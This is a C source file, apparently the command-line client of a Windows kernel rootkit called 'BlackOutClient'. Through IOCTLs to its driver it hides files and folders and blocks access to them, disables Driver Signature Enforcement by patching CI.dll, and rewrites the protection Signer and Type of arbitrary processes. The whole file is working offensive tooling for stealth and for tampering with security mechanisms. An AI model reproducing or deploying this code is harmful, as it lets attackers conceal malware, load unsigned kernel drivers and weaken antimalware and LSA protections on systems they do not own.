#include "../BlackOutClient/cGlobalDef.h"
#include "../BlackOutClient/cHelpers.h"

int main(int argc, char* argv[]) {
    if ((argc < 3 || argc > 4) && (argc != 5 || strcmp(argv[1], "/PsProtect") != 0)) {
        fprintf(stderr, "\n>> Usage: %s \n", argv[0]);

        fprintf(stderr, "\n [ FILE ]\n\
            \n/hide --path <FullPath>       : Hide a file/folder \
            \n/hide --protect               : Resrtrict access to all of the hidden files/folders \
            \n/hide --unprotect             : Remove all the restriction on the hidden files/folders \
            \n/unhide --me                  : Unhide all the hidden files/folders \n");

        fprintf(stderr, "\n [ SIGNATURE ENFORCEMENT ]\n\
            \n/dse --enable                 : Enable DSE (Driver Signature Enforcement) \
            \n/dse --disable                : Disable DSE (Driver Signature Enforcement)\n");

        fprintf(stderr, "\n [ PROCESS PROTECTION ]\n\
            \n/PsProtect <PID> <Signer> <Type>  : Changing the Signer & Type of a process via its PID \
            \n/PsProtect <PID> --revert         : Set the value to its original Signer and Type \
            \n/PsProtect --reference            : Showing the options for Signer and Type \n\n");
        return EXIT_FAILURE;
    }

    HANDLE hDevice = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "\n[-] Failed to open device\n\n");
        return EXIT_FAILURE;
    }

    /* ===========================================

                Process Protection

    ============================================== */

    if (strcmp(argv[1], "/PsProtect") == 0) {
        if (argc == 3 && strcmp(argv[2], "--reference") == 0) {
            fprintf(stderr, "\nSignatureType:\n");
            fprintf(stderr, "  0: PsProtectedTypeNone\n");
            fprintf(stderr, "  1: PsProtectedTypeProtectedLight\n");
            fprintf(stderr, "  2: PsProtectedTypeProtected\n");
            fprintf(stderr, "\nSignatureSigner:\n");
            fprintf(stderr, "  0: PsProtectedSignerNone\n");
            fprintf(stderr, "  1: PsProtectedSignerAuthenticode\n");
            fprintf(stderr, "  2: PsProtectedSignerCodeGen\n");
            fprintf(stderr, "  3: PsProtectedSignerAntimalware\n");
            fprintf(stderr, "  4: PsProtectedSignerLsa\n");
            fprintf(stderr, "  5: PsProtectedSignerWindows\n");
            fprintf(stderr, "  6: PsProtectedSignerWinTcb\n");
            fprintf(stderr, "  7: PsProtectedSignerWinSystem\n");
            fprintf(stderr, "  8: PsProtectedSignerApp\n");
            fprintf(stderr, "  9: PsProtectedSignerMax\n\n");
            return EXIT_SUCCESS;
        }

        ULONG pid = atoi(argv[2]);
        if (!IsProcessRunning(pid)) {
            fprintf(stderr, "\n[-] Error: Process with PID %lu does not exist.\n\n", pid);
            return EXIT_FAILURE;
        }

        PROTECTION_VALUES values;
        values.pid = pid;

        if (argc == 4 && strcmp(argv[3], "--revert") == 0) {
            DWORD bytesReturned;
            if (!DeviceIoControl(hDevice, IOCTL_REVERT_PROTECTION, &values, sizeof(values), NULL, 0, &bytesReturned, NULL)) {
                fprintf(stderr, "\n[-] Failed to send IOCTL_REVERT_PROTECTION\n\n");
            }
            else {
                printf("\n[+] Protection is reverted for PID %lu\n\n", pid);
            }
        }
        else if (argc == 5) {
            values.Signer = (UCHAR)atoi(argv[3]);
            values.Type = (UCHAR)atoi(argv[4]);

            DWORD bytesReturned;
            if (!DeviceIoControl(hDevice, IOCTL_SET_PROTECTION, &values, sizeof(values), NULL, 0, &bytesReturned, NULL)) {
                fprintf(stderr, "\n[-] Failed to send IOCTL_SET_PROTECTION\n\n");
            }
            else {
                printf("\n[+] Protection set for PID %lu with Signer %d and Type %d\n\n", pid, values.Signer, values.Type);
            }
        }
        else {
            fprintf(stderr, "\n>> Usage: %s /PsProtect <PID> <Signer> <Type>\n\n", argv[0]);
            return EXIT_FAILURE;
        }

        CloseHandle(hDevice);
        return EXIT_SUCCESS;
    }

    /* ===========================================

            Driver Signature Enforcement

    ============================================== */

    if (strcmp(argv[1], "/dse") == 0) {
        PVOID ciDllBase = GetCiDllBase();
        if (ciDllBase == NULL) {
            printf("Failed to get CI.dll base address.\n\n");
            return 1;
        }

        BOOLEAN enableDSE = strcmp(argv[2], "--enable") == 0;

        if (!enableDSE && strcmp(argv[2], "--disable") != 0) {
            printf("Invalid DSE_MODE. Use \"/dse --enable\" to enable or \"/dse --disable\" to disable.\n\n");
            return 1;
        }

        SetCiDllBase(hDevice, ciDllBase);
        SetDseMode(hDevice, enableDSE);

        CloseHandle(hDevice);
        return EXIT_SUCCESS;
    }

    /* ===========================================

                    Minifilter

    ============================================== */

    if (!InitializePathsAndDevice(argc, argv, fullPath, parentDir, folderName, deviceName, &hDevice)) {
        return EXIT_FAILURE;
    }

    BOOL result = FALSE;
    if (argc == 4 && strcmp(argv[1], "/hide") == 0 && strcmp(argv[2], "--path") == 0) {
        PrintPaths(argv[3], parentDir, folderName, deviceName);
        result = SetTargetFolder(hDevice, deviceName) && SetTargetFile(hDevice, folderName);
        if (result) printf("\n[+] Target folder and file set successfully.\n\n");
    }
    else if (argc == 3) {
        if (strcmp(argv[1], "/hide") == 0 && strcmp(argv[2], "--protect") == 0) {
            result = SendIoControl(hDevice, IOCTL_BLOCK_ACCESS, fullPath);
            if (result) printf("\n[+] Block access command sent successfully.\n\n");
        }
        else if (strcmp(argv[1], "/hide") == 0 && strcmp(argv[2], "--unprotect") == 0) {
            result = SendIoControl(hDevice, IOCTL_UNBLOCK_ACCESS, fullPath);
            if (result) printf("\n[+] Revert IO status command sent successfully.\n\n");
        }
        else if (strcmp(argv[1], "/unhide") == 0 && strcmp(argv[2], "--me") == 0) {
            result = SendIoControl(hDevice, IOCTL_UNHIDE_ALL_FILES, fullPath);
            if (result) printf("\n[+] Unhide all files command sent successfully.\n\n");
        }
        else {
            fprintf(stderr, "\n[-] Invalid command.\n\n");
        }
    }
    else {
        fprintf(stderr, "\n[-] Invalid command.\n");
        if (!result) fprintf(stderr, "\n[-] Operation failed. Error: %lu\n\n", GetLastError());
    }

    CloseHandle(hDevice);
    return result ? EXIT_SUCCESS : EXIT_FAILURE;
}